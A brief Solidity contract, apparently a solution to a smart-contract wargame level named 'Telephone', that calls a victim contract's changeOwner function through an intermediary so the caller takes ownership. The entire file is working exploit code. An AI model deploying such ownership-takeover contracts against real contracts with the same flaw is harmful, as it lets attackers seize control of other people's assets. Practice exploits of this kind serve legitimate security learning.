// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    function attack (address victim_address) external{
        ITelephone(victim_address).changeOwner(msg.sender);
    }
}